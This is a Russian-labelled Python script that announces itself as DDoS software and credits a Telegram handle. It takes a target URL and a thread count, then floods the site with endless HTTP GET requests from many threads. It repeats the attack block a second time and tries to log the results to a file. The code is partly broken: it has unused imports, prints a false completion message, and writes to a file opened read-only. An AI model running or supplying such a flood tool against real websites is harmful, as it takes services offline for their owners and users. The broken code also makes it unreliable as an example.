import colorama
import threading
import requests
import pygame as pg
from numba import njit
import cv2

print("[+] Приветствую User! ЭТО Soft для DDoS атак")
print("[+] Version: 2.12.5")
print("[+] Coder: Telegram: @NonKrypton")


def dos(target):
    while True:
        try:
            res = requests.get(target)
            print(colorama.Fore.YELLOW + "Request sent!" + colorama.Fore.WHITE)
        except requests.exceptions.ConnectionError:
            print(colorama.Fore.RED + "[+] " + colorama.Fore.LIGHTGREEN_EX + "Connection error!")


threads = 20

url = input("URL: ")

try:
    threads = int(input("Threads: "))
except ValueError:
    exit("Threads count is incorrect!")

if threads == 0:
    exit("Threads count is incorrect!")

for i in range(0, threads):
    thr = threading.Thread(target=dos, args=(url,))
    thr.start()
    print(str(i + 1) + " thread started!")

print("Атака на Сайт:", url ,"была завершена!")

print("Отправлено потоков:", threads)

url2 = input("Хотите повторить атаку ? [Yes/No]: ")

print("Начинаем повторную атаку...")

def dos(target):
    while True:
        try:
            res = requests.get(target)
            print(colorama.Fore.YELLOW + "Request sent!" + colorama.Fore.WHITE)
        except requests.exceptions.ConnectionError:
            print(colorama.Fore.RED + "[+] " + colorama.Fore.LIGHTGREEN_EX + "Connection error!")


threads = 20

url = input("URL: ")

try:
    threads = int(input("Потоки: "))
except ValueError:
    exit("Threads count is incorrect!")

if threads == 0:
    exit("Threads count is incorrect!")

for i in range(0, threads):
    thr = threading.Thread(target=dos, args=(url,))
    thr.start()
    print(str(i + 1) + " thread started!")

print("Атака на Сайт:", url ,"была завершена!")

print("Отправлено потоков:", threads)

f = open("ddos.txt", "r")
f.write("Было отправлено", threads ,"потоков." )
f.close()

print("Создатель/Кодер: ТГ: @NonKrypton")  
    
print("GoodBy")
    

         
